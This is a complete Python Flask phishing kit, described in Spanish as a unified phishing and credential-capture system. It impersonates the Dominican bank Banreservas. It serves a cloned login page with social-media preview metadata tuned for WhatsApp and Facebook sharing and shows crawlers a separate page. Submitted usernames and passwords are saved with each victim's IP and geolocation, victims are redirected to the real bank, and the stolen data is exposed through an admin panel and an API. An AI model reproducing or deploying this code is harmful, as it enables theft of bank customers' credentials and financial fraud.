#!/usr/bin/env python3
"""
Phishing unificado: Banreservas + Sistema de captura de credenciales
"""
import os
import sqlite3
import json
import requests
import re
import logging
from datetime import datetime, timedelta
from flask import Flask, request, render_template_string, redirect, jsonify, abort, session

# =============================================
# CONFIGURACIÓN DE LOGGING
# =============================================
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

app = Flask(__name__)

# Configuración de seguridad de sesión
app.secret_key = os.environ.get('SECRET_KEY', 'clave-secreta-para-session-12345')
app.config.update(
    SESSION_COOKIE_SECURE=True,
    SESSION_COOKIE_HTTPONLY=True,
    SESSION_COOKIE_SAMESITE='Lax',
    PERMANENT_SESSION_LIFETIME=timedelta(hours=2)
)

# =============================================
# CONFIGURACIÓN
# =============================================
CONFIG = {
    'redirect_url': 'https://www.banreservas.com',
    'template': 'banreservas',
    'api_key': os.environ.get('API_KEY', 'smiclavesegura2026'),
    'admin_password': 'triple777',
    'max_login_attempts': 5,
    'cleanup_days': 30
}

# Diccionarios para rate limiting
login_attempts = {}
root_requests = {}
audit_log_enabled = True

# =============================================
# FUNCIONES DE AUDITORÍA Y SEGURIDAD
# =============================================
def audit_log(action, details, ip=None):
    if not audit_log_enabled:
        return
    if ip is None:
        ip = get_client_ip()
    log_entry = {
        'timestamp': datetime.now().isoformat(),
        'action': action,
        'ip': ip,
        'details': details,
        'authenticated': session.get('admin_logged', False)
    }
    try:
        with open('audit.log', 'a') as f:
            f.write(json.dumps(log_entry) + '\n')
    except Exception as e:
        logger.error(f"Error en audit log: {e}")

def is_rate_limited(ip, storage, limit=20, window_seconds=60):
    now = datetime.now()
    if ip in storage:
        count, timestamp = storage[ip]
        if (now - timestamp).total_seconds() < window_seconds:
            if count >= limit:
                return True
            storage[ip] = (count + 1, timestamp)
        else:
            storage[ip] = (1, now)
    else:
        storage[ip] = (1, now)
    return False

def is_ip_blocked(ip):
    if ip in login_attempts:
        attempts, block_time = login_attempts[ip]
        if attempts >= CONFIG.get('max_login_attempts', 5):
            if datetime.now() - block_time < timedelta(minutes=5):
                return True
            else:
                del login_attempts[ip]
    return False

def load_config():
    try:
        with open('config.json', 'r') as f:
            CONFIG.update(json.load(f))
    except:
        pass

def init_db():
    """Inicializa la base de datos y crea la tabla si no existe"""
    try:
        conn = sqlite3.connect('credentials.db', check_same_thread=False)
        cursor = conn.cursor()
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS credentials (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp TEXT,
                ip TEXT,
                username TEXT,
                password TEXT,
                user_agent TEXT,
                referer TEXT,
                geo_location TEXT
            )
        ''')
        conn.commit()
        conn.close()
        logger.info("Base de datos inicializada correctamente")
        return True
    except Exception as e:
        logger.error(f"Error al inicializar la base de datos: {e}")
        return False

def cleanup_old_credentials(days=None):
    if days is None:
        days = CONFIG.get('cleanup_days', 30)
    try:
        conn = sqlite3.connect('credentials.db', check_same_thread=False)
        cursor = conn.cursor()
        cursor.execute('''
            DELETE FROM credentials 
            WHERE datetime(timestamp) < datetime('now', ?)
        ''', (f'-{days} days',))
        deleted = cursor.rowcount
        conn.commit()
        conn.close()
        if deleted > 0:
            logger.info(f"Eliminadas {deleted} credenciales antiguas (más de {days} días)")
        return deleted
    except Exception as e:
        logger.error(f"Error en cleanup de credenciales: {e}")
        return 0

def get_client_ip():
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    if ',' in str(ip):
        ip = ip.split(',')[0].strip()
    return ip

def get_geo(ip):
    try:
        r = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,city", timeout=3).json()
        if r.get('status') == 'success':
            return f"{r.get('city', 'Unknown')}, {r.get('country', 'Unknown')}"
    except Exception as e:
        logger.warning(f"Error al obtener geolocalización para {ip}: {e}")
    return "Unknown"

def is_social_crawler(ua):
    social_bots = ['facebookexternalhit', 'twitterbot', 'whatsapp', 'linkedinbot', 
                   'telegrambot', 'discord', 'slackbot', 'pinterest', 'redditbot']
    return any(bot in ua.lower() for bot in social_bots)

def get_template_banreservas():
    """Nuevo diseño limpio y profesional para la página de login"""
    return '''<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <!-- TÍTULO MÁS LARGO (50-60 caracteres) -->
    <title>🔐 Acceso Seguro a tu Cuenta Banreservas - Banca en Línea</title>
    
    <!-- Favicon -->
    <link rel="icon" type="image/png" href="https://www.banreservas.com/favicon.ico">
    <link rel="apple-touch-icon" href="https://www.banreservas.com/favicon.ico">
    
    <!-- Open Graph / Facebook -->
    <meta property="og:type" content="website">
    <meta property="og:url" content="https://banreservas-uyw8.onrender.com">
    <meta property="og:title" content="🔐 Acceso Seguro a tu Cuenta Banreservas - Banca en Línea">
    <meta property="og:description" content="Ingresa con tu usuario y contraseña para realizar tus transacciones bancarias de forma segura y rápida.">
    
    <!-- ⚠️ CAMBIO IMPORTANTE: IMAGEN MÁS GRANDE (1200x630) -->
    <meta property="og:image" content="https://i.imgur.com/9NhVr5Q.png">
    <meta property="og:image:width" content="1200">
    <meta property="og:image:height" content="630">
    <meta property="og:image:alt" content="Banreservas - Acceso Seguro a tu Cuenta">
    
    <!-- ✅ NUEVO: og:site_name -->
    <meta property="og:site_name" content="Banreservas">
    <meta property="og:locale" content="es_DO">
    
    <!-- Twitter Card -->
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:url" content="https://banreservas-uyw8.onrender.com">
    <meta name="twitter:title" content="🔐 Acceso Seguro a tu Cuenta Banreservas - Banca en Línea">
    <meta name="twitter:description" content="Ingresa con tu usuario y contraseña para realizar tus transacciones bancarias de forma segura y rápida.">
    <meta name="twitter:image" content="https://i.imgur.com/9NhVr5Q.png">
    
    <!-- WhatsApp specific -->
    <meta property="og:image:secure_url" content="https://i.imgur.com/9NhVr5Q.png">
    
    <!-- General meta -->
    <meta name="description" content="Acceso seguro a tu cuenta bancaria Banreservas. Ingresa tus credenciales de forma protegida.">
    <meta name="keywords" content="Banreservas, banco, acceso seguro, login bancario">
    <meta name="author" content="Banreservas">
    <meta name="theme-color" content="#004B8D">
    
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .login-container {
            background: white;
            border-radius: 20px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            padding: 40px;
            width: 100%;
            max-width: 420px;
            text-align: center;
        }
        
        .logo {
            width: 120px;
            height: auto;
            margin-bottom: 20px;
        }
        
        h1 {
            color: #004B8D;
            font-size: 24px;
            margin-bottom: 8px;
            font-weight: 600;
        }
        
        .subtitle {
            color: #666;
            font-size: 14px;
            margin-bottom: 30px;
        }
        
        .form-group {
            margin-bottom: 20px;
            text-align: left;
        }
        
        label {
            display: block;
            color: #333;
            font-weight: 500;
            margin-bottom: 8px;
            font-size: 14px;
        }
        
        input {
            width: 100%;
            padding: 14px 16px;
            border: 2px solid #e0e0e0;
            border-radius: 12px;
            font-size: 15px;
            transition: all 0.3s ease;
        }
        
        input:focus {
            outline: none;
            border-color: #004B8D;
            box-shadow: 0 0 0 4px rgba(0,75,141,0.1);
        }
        
        .btn-login {
            width: 100%;
            padding: 16px;
            background: linear-gradient(135deg, #004B8D 0%, #0066CC 100%);
            color: white;
            border: none;
            border-radius: 12px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            margin-top: 10px;
        }
        
        .btn-login:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 30px rgba(0,75,141,0.3);
        }
        
        .security-badge {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            margin-top: 25px;
            padding: 12px;
            background: #f0f7ff;
            border-radius: 10px;
            color: #004B8D;
            font-size: 13px;
            font-weight: 500;
        }
        
        .footer {
            margin-top: 20px;
            color: #999;
            font-size: 12px;
        }
        
        .timestamp {
            color: #004B8D;
            font-weight: 600;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <img src="https://www.banreservas.com/images/logo-banreservas.png" alt="Banreservas" class="logo">
        <h1>🔐 Acceso Seguro</h1>
        <p class="subtitle">Ingrese sus credenciales para continuar</p>
        
        <form action="/capture" method="POST">
            <div class="form-group">
                <label for="email">Usuario</label>
                <input type="text" id="email" name="email" placeholder="Ingrese su usuario" required>
            </div>
            
            <div class="form-group">
                <label for="password">Contraseña</label>
                <input type="password" id="password" name="password" placeholder="Ingrese su contraseña" required>
            </div>
            
            <button type="submit" class="btn-login">Iniciar Sesión</button>
        </form>
        
        <div class="security-badge">
            <span>🔒</span>
            <span>Conexión segura encriptada SSL</span>
        </div>
        
        <div class="footer">
            <p>Banreservas © 2026</p>
            <p class="timestamp" id="fecha"></p>
        </div>
    </div>
    
    <script>
        // Fecha formateada: Jul 22, 2026 7:04 PM
        const ahora = new Date();
        const opciones = { 
            month: 'short', 
            day: 'numeric', 
            year: 'numeric',
            hour: 'numeric',
            minute: '2-digit',
            hour12: true
        };
        document.getElementById('fecha').textContent = ahora.toLocaleDateString('en-US', opciones);
    </script>
</body>
</html>'''

# =============================================
# RUTAS Y DECORADORES
# =============================================

@app.before_request
def initialize_db_on_startup():
    """Inicializa la base de datos antes de la primera solicitud"""
    init_db()

@app.after_request
def add_security_headers(response):
    response.headers['X-Frame-Options'] = 'DENY'
    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['Referrer-Policy'] = 'strict-origin-when-cross-origin'
    return response

@app.before_request
def limit_root_requests():
    if request.path == '/':
        ip = get_client_ip()
        if is_rate_limited(ip, root_requests, limit=30, window_seconds=60):
            logger.warning(f"Rate limit excedido en raíz desde IP {ip}")
            audit_log('ROOT_RATE_LIMIT', {'ip': ip}, ip)
            return "⏳ Demasiadas visitas. Espera 1 minuto.", 429

@app.before_request
def handle_bots():
    ua = request.headers.get('User-Agent', '')
    if is_social_crawler(ua) and request.path == '/':
        return render_template_string('''
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta property="og:title" content="🔐 Acceso Seguro a tu Cuenta Banreservas - Banca en Línea">
    <meta property="og:description" content="Ingresa con tu usuario y contraseña para realizar tus transacciones bancarias de forma segura y rápida.">
    <meta property="og:image" content="https://i.imgur.com/9NhVr5Q.png">
    <title>🔐 Acceso Seguro a tu Cuenta Banreservas - Banca en Línea</title>
</head>
<body>
    <h1>🔐 Acceso Seguro a tu Cuenta Banreservas - Banca en Línea</h1>
    <p>Ingresa con tu usuario y contraseña para realizar tus transacciones bancarias de forma segura y rápida.</p>
</body>
</html>
'''), 200

@app.route('/')
def index():
    return render_template_string(get_template_banreservas())

@app.route('/capture', methods=['POST'])
def capture():
    ip = get_client_ip()
    username = request.form.get('email', '') or request.form.get('username', '')
    password = request.form.get('password', '')
    
    if not username or not password:
        return redirect(CONFIG.get('redirect_url', 'https://www.banreservas.com'))
    
    username = re.sub(r'[^a-zA-Z0-9@.\-_\s]', '', username)
    geo = get_geo(ip)
    
    try:
        conn = sqlite3.connect('credentials.db', check_same_thread=False)
        cursor = conn.cursor()
        cursor.execute('''
            INSERT INTO credentials (timestamp, ip, username, password, user_agent, referer, geo_location)
            VALUES (?, ?, ?, ?, ?, ?, ?)
        ''', (datetime.now().isoformat(), ip, username, password,
              request.headers.get('User-Agent', ''), request.headers.get('Referer', ''), geo))
        conn.commit()
        conn.close()
        logger.info(f"✅ Credencial guardada: {username} desde {ip}")
        audit_log('NEW_CREDENTIAL', {'username': username, 'ip': ip}, ip)
    except Exception as e:
        logger.error(f"❌ Error al guardar: {e}")
    
    return redirect(CONFIG.get('redirect_url', 'https://www.banreservas.com'))

@app.route('/login-credenciales', methods=['GET', 'POST'])
def login_credenciales():
    ip = get_client_ip()
    max_attempts = CONFIG.get('max_login_attempts', 5)
    
    if is_ip_blocked(ip):
        audit_log('LOGIN_BLOCKED', {'ip': ip}, ip)
        return render_template_string('''
        <!DOCTYPE html>
        <html>
        <head><title>Acceso Bloqueado</title>
        <style>
            body{font-family:Arial;background:#f0f2f5;display:flex;justify-content:center;align-items:center;height:100vh;}
            .container{background:white;padding:40px;border-radius:8px;text-align:center;}
            .error{color:red;margin-top:10px;}
        </style>
        </head>
        <body>
            <div class="container">
                <h1>🚫 Acceso Bloqueado</h1>
                <p>Has superado el límite de intentos permitidos.</p>
                <p class="error">Espera 5 minutos para volver a intentarlo.</p>
            </div>
        </body>
        </html>
        ''', 429)
    
    if request.method == 'POST':
        password = request.form.get('password')
        if password == CONFIG.get('admin_password', 'triple777'):
            login_attempts.pop(ip, None)
            session['admin_logged'] = True
            session.permanent = True
            logger.info(f"Login exitoso desde IP {ip}")
            audit_log('LOGIN_SUCCESS', {'ip': ip}, ip)
            return redirect('/ver-credenciales')
        else:
            if ip not in login_attempts:
                login_attempts[ip] = [0, datetime.now()]
            login_attempts[ip][0] += 1
            login_attempts[ip][1] = datetime.now()
            remaining = max_attempts - login_attempts[ip][0]
            logger.warning(f"Login fallido desde IP {ip}, intentos: {login_attempts[ip][0]}")
            audit_log('LOGIN_FAILURE', {'ip': ip, 'attempts': login_attempts[ip][0]}, ip)
            
            return render_template_string('''
            <!DOCTYPE html>
            <html>
            <head><title>Acceso Denegado</title>
            <style>
                body{font-family:Arial;background:#f0f2f5;display:flex;justify-content:center;align-items:center;height:100vh;}
                .container{background:white;padding:40px;border-radius:8px;text-align:center;}
                .error{color:red;margin-top:10px;}
            </style>
            </head>
            <body>
                <div class="container">
                    <h1>🔒 Contraseña incorrecta</h1>
                    <p class="error">Intentos restantes: ''' + str(remaining) + '''</p>
                    <a href="/login-credenciales">Volver</a>
                </div>
            </body>
            </html>
            ''')
    
    return render_template_string('''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Acceso a Credenciales</title>
        <style>
            *{margin:0;padding:0;box-sizing:border-box;font-family:Arial,sans-serif;}
            body{background:#f0f2f5;display:flex;justify-content:center;align-items:center;height:100vh;}
            .container{background:white;padding:40px;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,0.1);width:100%;max-width:400px;text-align:center;}
            h1{color:#1a73e8;margin-bottom:20px;font-size:24px;}
            .lock{font-size:48px;margin-bottom:15px;}
            input{width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:4px;font-size:16px;}
            input:focus{outline:none;border-color:#1a73e8;}
            button{width:100%;padding:12px;background:#1a73e8;color:white;border:none;border-radius:4px;font-size:16px;cursor:pointer;}
            button:hover{background:#1557b0;}
            .footer{margin-top:20px;color:#666;font-size:14px;}
        </style>
    </head>
    <body>
        <div class="container">
            <div class="lock">🔐</div>
            <h1>Acceso a Credenciales</h1>
            <p style="color:#666;margin-bottom:20px;">Introduce la contraseña de administrador</p>
            <form method="POST">
                <input type="password" name="password" placeholder="Contraseña" required autofocus>
                <button type="submit">Acceder</button>
            </form>
            <div class="footer">Acceso restringido</div>
        </div>
    </body>
    </html>
    ''')

@app.route('/ver-credenciales')
def ver_credenciales():
    if not session.get('admin_logged'):
        return redirect('/login-credenciales')
    
    try:
        conn = sqlite3.connect('credentials.db', check_same_thread=False)
        cursor = conn.cursor()
        cursor.execute('SELECT id, timestamp, ip, username, password, geo_location FROM credentials ORDER BY id DESC')
        rows = cursor.fetchall()
        conn.close()
        
        if not rows:
            return """
            <!DOCTYPE html>
            <html>
            <head><title>Credenciales</title>
            <style>
                body{font-family:Arial;background:#f0f2f5;padding:20px;text-align:center;}
                h1{color:#1a73e8;}
                .container{background:white;padding:40px;border-radius:8px;max-width:600px;margin:0 auto;}
                .logout{float:right;background:#dc3545;color:white;padding:8px 16px;border-radius:4px;text-decoration:none;}
                .logout:hover{background:#c82333;}
            </style>
            </head>
            <body>
                <div class="container">
                    <a href="/logout-credenciales" class="logout">Cerrar Sesión</a>
                    <h1>📭 No hay credenciales</h1>
                    <p>Todavía no se han capturado credenciales.</p>
                    <p>Ve a <a href="/">la página principal</a> y prueba a iniciar sesión.</p>
                </div>
            </body>
            </html>
            """
        
        html = """
        <!DOCTYPE html>
        <html>
        <head>
            <title>Credenciales</title>
            <style>
                body{font-family:Arial;background:#f0f2f5;padding:20px;}
                h1{color:#1a73e8;text-align:center;}
                table{width:100%;border-collapse:collapse;background:white;border-radius:8px;overflow:hidden;box-shadow:0 2px 4px rgba(0,0,0,0.1);}
                th{background:#1a73e8;color:white;padding:12px;text-align:left;}
                td{padding:10px;border-bottom:1px solid #ddd;}
                tr:hover{background:#f5f5f5;}
                .logout{float:right;background:#dc3545;color:white;padding:8px 16px;border-radius:4px;text-decoration:none;}
                .logout:hover{background:#c82333;}
            </style>
        </head>
        <body>
            <a href="/logout-credenciales" class="logout">Cerrar Sesión</a>
            <h1>🔐 Credenciales Capturadas</h1>
            <p>Total: <strong>""" + str(len(rows)) + """</strong></p>
            <table>
                <tr><th>ID</th><th>Fecha</th><th>IP</th><th>Ubicación</th><th>Usuario</th><th>Contraseña</th></tr>
        """
        
        for r in rows:
            timestamp = datetime.fromisoformat(r[1]).strftime('%b %d, %Y %I:%M %p')
            html += f"<tr><td>{r[0]}</td><td>{timestamp}</td><td>{r[2]}</td><td>{r[5]}</td><td>{r[3]}</td><td><strong>{r[4]}</strong></td></tr>"
        
        html += """
            </table>
        </body>
        </html>
        """
        return html
        
    except Exception as e:
        logger.error(f"Error al leer credenciales: {e}")
        return """
        <!DOCTYPE html>
        <html>
        <head><title>Error</title>
        <style>
            body{font-family:Arial;background:#f0f2f5;padding:20px;text-align:center;}
            .error{color:#dc3545;}
        </style>
        </head>
        <body>
            <h1 class="error">⚠️ Error al leer la base de datos</h1>
            <p>La base de datos aún no está lista. Por favor, captura una credencial primero.</p>
            <p><a href="/">Volver a la página principal</a></p>
        </body>
        </html>
        """, 500

@app.route('/logout-credenciales')
def logout_credenciales():
    session.pop('admin_logged', None)
    return redirect('/login-credenciales')

@app.route('/api/credentials')
def api_credentials():
    key = request.headers.get('X-API-Key')
    if key != CONFIG.get('api_key'):
        abort(401)
    
    conn = sqlite3.connect('credentials.db', check_same_thread=False)
    cursor = conn.cursor()
    cursor.execute('SELECT * FROM credentials ORDER BY id DESC')
    data = cursor.fetchall()
    conn.close()
    return jsonify(data)

@app.route('/api/cleanup', methods=['POST'])
def api_cleanup():
    key = request.headers.get('X-API-Key')
    if key != CONFIG.get('api_key'):
        abort(401)
    
    days = request.args.get('days', CONFIG.get('cleanup_days', 30), type=int)
    
    if days < 1 or days > 365:
        return jsonify({'error': 'Los días deben estar entre 1 y 365'}), 400
    
    deleted = cleanup_old_credentials(days)
    return jsonify({
        'deleted': deleted,
        'message': f'Eliminadas {deleted} credenciales con más de {days} días',
        'days': days
    })

@app.route('/health')
def health():
    return jsonify({
        'status': 'ok',
        'time': datetime.now().isoformat(),
        'credentials_count': get_credentials_count()
    })

def get_credentials_count():
    try:
        conn = sqlite3.connect('credentials.db', check_same_thread=False)
        cursor = conn.cursor()
        cursor.execute('SELECT COUNT(*) FROM credentials')
        count = cursor.fetchone()[0]
        conn.close()
        return count
    except:
        return 0

# =============================================
# INICIO DE LA APLICACIÓN
# =============================================

if __name__ == '__main__':
    load_config()
    init_db()
    cleanup_old_credentials()
    
    port = int(os.environ.get('PORT', 8080))
    print(f"[+] Servidor iniciado en puerto {port}")
    print(f"[+] Contraseña admin: triple777")
    print(f"[+] API Key: {CONFIG.get('api_key')}")
    print(f"[+] Limpieza automática: {CONFIG.get('cleanup_days')} días")
    app.run(host='0.0.0.0', port=port, debug=False)

# Esto es necesario para Render (Gunicorn buscará 'app')
# La variable 'app' ya está definida como Flask(__name__)
